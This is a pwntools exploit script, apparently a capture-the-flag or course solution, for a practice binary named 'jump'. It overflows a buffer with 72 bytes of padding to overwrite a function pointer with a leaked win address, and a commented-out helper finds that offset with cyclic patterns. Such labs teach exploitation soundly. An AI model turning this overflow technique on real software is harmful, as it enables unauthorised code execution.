#!/usr/bin/env python3

from pwn import *

p = process("./jump")
# p = remote("6447.lol", 24224)

p.recvuntil(b"at ")
win_address = p.recvline().strip() # we read in the win address
win_address = int(win_address, 16) # and store it in an integer format

# payload = cyclic(200)

# def find_offset_from_rdp(after=b'?\n', cyclic_length=500, max_attempts=20):
#     assert cyclic_length > 4, "Cyclic length must be greater than 4."
    
#     with context.local(log_level='error'):
#         for attempt in range(1, max_attempts + 1):
#             P = process("./jump")


#             cyclic_pattern = cyclic(cyclic_length)
#             P.sendlineafter(after, cyclic_pattern)
            
#             try:
#                 P.recvuntil('jump to ')
#                 leak = P.recvline().strip()
#                 crash_value = int(leak, 16)
                
#                 offset = cyclic_find(crash_value)
#                 if offset != -1:
#                     P.close()
#                     return offset

#             except EOFError:
#                 P.close()
#                 continue

#             P.close()

#     return None

# offset = find_offset_from_rdp('')
# print(offset)

payload = b"A" * 72 # rax register was corrupted by 7016996846897815923, which by running `cyclic -l` returned an offset of 72
payload += p64(win_address) # insert win_address, overriding function pointer

p.sendlineafter(b"pointers work ?", payload)

p.interactive()